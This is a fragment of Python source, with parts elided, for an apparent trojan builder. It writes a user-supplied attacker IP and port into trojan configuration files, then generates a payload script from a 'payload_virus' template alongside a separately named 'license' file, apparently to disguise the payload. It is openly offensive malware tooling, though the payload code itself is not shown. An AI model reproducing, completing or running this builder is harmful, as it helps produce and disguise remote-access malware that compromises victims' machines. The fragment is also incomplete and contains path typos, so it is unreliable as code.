...
if type_v == True:
    while True:
        ...
        if str(local_or_) =="public":
            ...
            file=open(str(location)+"//source//trojan_licen//ip.txt",'w');file.write("127.0.0.1");file.close()
            file2=open(str(location)+"//source//trojan_licen//port.txt",'w');file2.write(f'{port1}');file2.close()
            file_1=open(str(location)+"//source//trojan//ip.txt","w");file_1.write(f'{ip}');file_1.close()
            file_2=open(str(location)+"//source//trojan//port.txt","w");file_2.write(f'{port2}');file_2.close()
            file_name=input(" Enter The File Name for license >> ")
            trojan_name=input(" Enter The Pyload name >> ")
            os.startfile(str(location)+"//creator.py")
            trojan_source_code_public=open(str(location)+"//creator.txt","r").read()
            virus_source_code_public=open(str(location)+"//source//payload_virus.txt",'r').read()
            fiel_finall=open(str(location)+f"//payload//{trojan_name}.py","w").write(str(virus_source_code_public))
            creator=open(str(location)+f"//payload//{file_name}.py","w");creator.write(str(trojan_source_code_public));creator.close()
        ...
        if str(local_or_) == "local":
            ...
            file=open(str(location)+"//source//trojan//ip.txt",'w');file.write(f'{ip}');file.close()
            file2=open(str(location)+"//source//trojan//port.txt",'w');file2.write(f'{port}');file2.close()
            file_name=input(" Enter The File Name for license >> ")
            ...
            file000=open(str(location)+"//source//payload_virus.txt","r").read()
            ...
            n=["n","N"]
            if fin_type in yes:
                os.startfile(str(location)+"//paylaod//"+str(file_name)+str(".py"))
                os.system("pause");break
            if fin_type in n:
                os.system("pause");break
...
if type_v == False:
    ...
    if m == True:
        port=input(" Enter The Port >> ")
        w1=open(str(location)+"//source//trojan//ip.txt","w");w1.write(ip);w1.close()
        w2=open(str(location)+"//source//trojan//port.txt","w");w2.write(port);w2.close()
